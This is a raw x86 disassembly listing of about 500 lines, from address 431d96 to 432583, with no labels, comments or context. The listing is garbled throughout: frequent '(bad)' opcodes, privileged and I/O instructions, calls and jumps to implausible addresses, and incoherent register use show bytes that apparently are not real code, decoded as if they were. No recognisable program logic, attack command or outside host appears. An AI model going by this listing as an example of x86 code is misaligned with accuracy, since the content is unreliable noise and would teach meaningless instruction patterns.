  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
